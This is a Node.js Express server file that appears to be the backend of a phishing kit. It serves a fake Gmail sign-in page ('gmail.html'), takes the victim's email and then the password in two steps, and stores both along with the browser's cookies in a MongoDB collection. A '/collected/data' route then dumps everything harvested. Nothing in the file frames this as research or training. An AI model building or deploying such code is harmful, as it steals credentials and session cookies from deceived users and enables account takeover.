const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const mongoose = require('mongoose');
const session = require('express-session');
const express = require('express');
require('dotenv').config();
const app = express()
const port = 3000

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cookieParser());
app.set('view engine', 'ejs');

mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true });

//creating a schema for storing collected data in database.
const login = new mongoose.Schema({
  email: {type: String, required: true},
  password: {type: String, required: true},
  cookies: mongoose.Schema.Types.Mixed

})

//defining model for login schema
const User = mongoose.model('User', login);


app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true }
}));

const page = __dirname + '/views/gmail.html';
app.get('/', (req, res) => {
    res.sendFile(page);
  });

const PasswordPage = __dirname + '/views/pass.ejs';
let mail = "";
app.post('/Submit', (req, res) => {
    mail = req.body.email;
    console.log(mail);
    res.render(PasswordPage, {email: mail})
})



app.get('/email', (req, res) => {
  let mycookie = req.cookies.email;
  console.log(req.cookies);
  console.log(mycookie);
  res.send(mycookie);
})


app.post('/next', (req, res) => {
  let password = req.body.password;
  let mycookie = req.cookies;
  User.create({email: mail, password: password, cookies: mycookie});

  res.json({
    email : mail,
    password : password
  });
})

const DataPage = __dirname + '/views/collect.ejs';
app.get('/collected/data', (req, res) => {
  User.find().then(users => {
    console.log(users);
    console.log(req.session);
    res.json({data: users})
  }).catch(error => {
    console.log(error);
  });
});


  


app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})